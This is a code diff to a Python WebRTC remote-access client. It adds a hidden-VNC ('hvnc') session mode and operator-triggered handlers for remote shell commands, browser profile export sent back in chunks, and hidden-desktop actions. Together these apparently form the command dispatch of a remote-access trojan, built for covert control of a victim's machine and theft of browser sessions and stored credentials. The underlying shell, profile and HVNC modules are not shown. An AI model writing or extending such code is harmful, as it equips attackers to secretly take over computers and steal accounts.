@@ -88,6 +88,8 @@ def _coerce_session_mode(mode: Any) -> str | None:
         return "view"
     if value in {"hidden", "hidden-manage", "hidden_manage", "hidden-desktop", "hidden_desktop"}:
         return "hidden"
+    if value in {"hvnc", "hiddenvnc", "createdesktop"}:
+        return "hvnc"
     if value in {"manage", "control", "full"}:
         return "manage"
     return None
@@ -537,12 +539,16 @@ class WebRTCClient:
             offered_kinds = {
                 transceiver.kind for transceiver in peer_connection.getTransceivers()
             }
+            logger.info("Offered kinds from operator: %s, available tracks: %s", 
+                       offered_kinds, [t.kind for t in media_tracks])
             for track in media_tracks:
                 if track.kind in offered_kinds:
+                    logger.info("Adding track: kind=%s, id=%s", track.kind, getattr(track, 'id', 'unknown'))
                     sender = peer_connection.addTrack(track)
                     if track.kind == "video":
                         self._video_sender = sender
                         await self._tune_video_sender(sender, bitrate_bps=_resolve_profile_bitrate(None))
+                        logger.info("Video sender configured")
 
             answer = await peer_connection.createAnswer()
             await peer_connection.setLocalDescription(answer)
@@ -865,6 +871,109 @@ class WebRTCClient:
                     data_channel,
                     "input_blocking_status_failed",
                     "Failed to get input blocking status.",
+                )
+            return
+
+        # Remote Shell Actions
+        if action.startswith("shell_"):
+            shell_action = action[6:]  # Remove "shell_" prefix
+            try:
+                from remote_client.shell import handle_shell_action
+                
+                # Create output callback for interactive sessions
+                def shell_output_callback(session_id: str, output: str):
+                    try:
+                        self._send_payload(
+                            data_channel,
+                            {
+                                "action": "shell_output",
+                                "session_id": session_id,
+                                "output": output,
+                            },
+                        )
+                    except Exception as e:
+                        logger.debug("Failed to send shell output: %s", e)
+                
+                response = handle_shell_action(shell_action, payload, shell_output_callback)
+                self._send_payload(data_channel, response)
+            except ImportError as exc:
+                logger.warning("Shell module import failed: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "shell_unavailable",
+                    "Remote shell module not available.",
+                )
+            except Exception as exc:
+                logger.warning("Shell action %s failed: %s", action, exc)
+                self._send_payload(
+                    data_channel,
+                    {
+                        "action": action,
+                        "success": False,
+                        "error": str(exc),
+                    },
+                )
+            return
+
+        # Browser Profile Export Actions
+        if action.startswith("profile_"):
+            profile_action = action[8:]  # Remove "profile_" prefix
+            try:
+                from remote_client.browser_profile import get_profile_exporter
+                exporter = get_profile_exporter()
+                response = exporter.handle_action(profile_action, payload)
+                
+                # For large profile exports, send in chunks
+                if response.get("success") and response.get("data"):
+                    data = response.pop("data")
+                    # Send metadata first
+                    self._send_payload(data_channel, response)
+                    # Then send data in chunks
+                    await self._send_chunked_payload(data_channel, data, "profile")
+                else:
+                    self._send_payload(data_channel, response)
+                    
+            except ImportError as exc:
+                logger.warning("Profile module import failed: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "profile_unavailable",
+                    "Browser profile export not available.",
+                )
+            except Exception as exc:
+                logger.warning("Profile action %s failed: %s", action, exc)
+                self._send_payload(
+                    data_channel,
+                    {
+                        "action": action,
+                        "success": False,
+                        "error": str(exc),
+                    },
+                )
+            return
+
+        # HVNC Actions
+        if action.startswith("hvnc_"):
+            hvnc_action = action[5:]  # Remove "hvnc_" prefix
+            try:
+                from remote_client.windows.hvnc_actions import handle_hvnc_action
+                response = handle_hvnc_action(hvnc_action, payload)
+                self._send_payload(data_channel, response)
+            except ImportError:
+                self._send_error(
+                    data_channel,
+                    "hvnc_unavailable",
+                    "HVNC module not available on this platform.",
+                )
+            except Exception as exc:
+                logger.warning("HVNC action %s failed: %s", action, exc)
+                self._send_payload(
+                    data_channel,
+                    {
+                        "action": action,
+                        "success": False,
+                        "error": str(exc),
+                    },
                 )
             return
 
